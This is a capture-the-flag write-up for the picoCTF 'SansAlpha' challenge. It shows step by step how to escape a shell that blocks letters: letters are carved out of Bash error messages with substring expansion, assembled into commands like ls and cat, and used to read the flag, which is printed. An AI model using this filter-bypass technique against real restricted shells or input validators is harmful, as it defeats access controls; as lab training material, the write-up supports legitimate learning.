# Overview 
Category: [General Skills]()

AUTHOR: SYREAL

# Description
The Multiverse is within your grasp! Unfortunately, the server that contains the secrets of the multiverse is in a universe where keyboards only have numbers and (most) symbols.

# Solution
- Connect:
>ssh -p 61880 ctf-player@mimas.picoctf.net

- Try use ls :
```
SansAlpha$ ls
SansAlpha: Unknown character detected
```
-  Entering the number works, but it doesn't seem useful on its own :
```
SansAlpha$ 1
bash: 1: command not found
```
- I searched “Bash no letters” and I found an informative article
- Please read it : [Link](https://www.commandlinefu.com/commands/view/11704/launch-bash-without-using-any-letters)
- command : 
```
"$(- 2>&1)";${_%%:*}
```
- The first part, "$(- 2>&1)"; can be left as is. Running this alone we get:
```
SansAlpha$ "$(- 2>&1)"
bash: bash: -: command not found: command not found
```
- This is important because we can pass letters into Bash. Currently, those letters are bash: -: command not Found - the error is output as the author describes above.
- We get the position number by looking at the index (starting at 0) of the character we want to extract from the string:
```
SansAlpha$ "$(- 2>&1)";${_:9:1}
bash: bash: -: command not found: command not found
bash: c: command not found
```
<img src="https://i.imgur.com/uzAsHmR.png">

- We can also select multiple letters in a row by changing the second digit in the brace expression:
```
SansAlpha$ "$(- 2>&1)";${_:12:4}
bash: bash: -: command not found: command not found
bash: mand: command not found
```
- Recall that the Ubuntu distribution was previously minified. This means that trying to run a command that is not installed will give us a big error message with more letters to use. To trigger this message, we need to run a command - man is a natural choice as it can be run simply by selecting three consecutive numbers from the command from our string.
```
SansAlpha$ "$(- 2>&1)";${_:12:3} ${_:12:1}
bash: bash: -: command not found: command not found
This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, including manpages, you can run the 'unminimize'
command. You will still need to ensure the 'man-db' package is installed.
```
- Here, the first part generates a new error and the second part selects the character at index 0, now T.
```
SansAlpha$ "$("$(- 2>&1)";${_:12:3} ${_:12:1} 2>&1)";${_:0:1}
bash: bash: -: command not found: command not found
bash: $'This system has been minimized by removing packages and content that are\nnot required on a system that users do not log into.\n\nTo restore this content, including manpages, you can run the \'unminimize\'\ncommand. You will still need to ensure the \'man-db\' package is installed.': command not found
bash: T: command not found
```
- With this capability, we now have enough letters to search and browse folders. Running "ls" yields the following output:
```
SansAlpha$ "$("$(- 2>&1)";${_:12:3} ${_:12:1} 2>&1)";${_:116:1}${_:3:1}
bash: bash: -: command not found: command not found
bash: $'This system has been minimized by removing packages and content that are\nnot required on a system that users do not log into.\n\nTo restore this content, including manpages, you can run the \'unminimize\'\ncommand. You will still need to ensure the \'man-db\' package is installed.': command not found
blargh    on-calastran.txt
```
Another "ls" later shows our remaining files are "flags.txt" and "on-alpha-9.txt". The second file again serves as a set of words to support the workaround. There is no "x" in the error message, instead we can run "cat *" to print every file in the directory at once, but still no flags
```
SansAlpha$ "$("$(- 2>&1)";${_:12:3} ${_:12:1} 2>&1)";${_:56:1}${_:13:1}${_:59:1} *
bash: bash: -: command not found: command not found
bash: $'This system has been minimized by removing packages and content that are\nnot required on a system that users do not log into.\n\nTo restore this content, including manpages, you can run the \'unminimize\'\ncommand. You will still need to ensure the \'man-db\' package is installed.': command not found
cat: blargh: Is a directory
The Calastran multiverse is a complex and interconnected web of realities, each
with its own distinct characteristics and rules. At its core is the Nexus, a
cosmic hub that serves as the anchor point for countless universes and
dimensions. These realities are organized into Layers, with each Layer
representing a unique level of existence, ranging from the fundamental building
blocks of reality to the most intricate and fantastical realms. Travel between
Layers is facilitated by Quantum Bridges, mysterious conduits that allow
individuals to navigate the multiverse. Notably, the Calastran multiverse
exhibits a dynamic nature, with the Fabric of Reality continuously shifting and
evolving. Within this vast tapestry, there exist Nexus Nodes, focal points of
immense energy that hold sway over the destinies of entire universes. The
enigmatic Watchers, ancient beings attuned to the ebb and flow of the
multiverse, observe and influence key events. While the structure of Calastran
embraces diversity, it also poses challenges, as the delicate balance between
the Layers requires vigilance to prevent catastrophic breaches and maintain the
cosmic harmony.
```
- We will see where the flag is located: ./blargh/flag.txt ./*/????.???. To avoid any restrictions, make sure the command works. All the letters needed to get there are displayed first and that is ./bin/cat ...
So we can print out the flag with this command:
```
SansAlpha$ "$("$(- 2>&1)";${_:12:3} ${_:12:1} 2>&1)";/${_:16:1}${_:2:1}${_:19:1}/${_:56:1}${_:13:1}${_:59:1} ./*/????.???
bash: bash: -: command not found: command not found
bash: $'This system has been minimized by removing packages and content that are\nnot required on a system that users do not log into.\n\nTo restore this content, including manpages, you can run the \'unminimize\'\ncommand. You will still need to ensure the \'man-db\' package is installed.': command not found
return 0 picoCTF{7h15_mu171v3r53_15_m4dn355_640b6add}
```
It can also be as short as this   ^.\^
```
SansAlpha$ "$(- 2>&1)";/???/${_:9:1}${_:1:1}${_:19:1} ./*/????.???
bash: bash: -: command not found: command not found
return 0 picoCTF{7h15_mu171v3r53_15_m4dn355_640b6add}
SansAlpha$  Connection to mimas.picoctf.net closed by remote host.
Connection to mimas.picoctf.net closed.
```
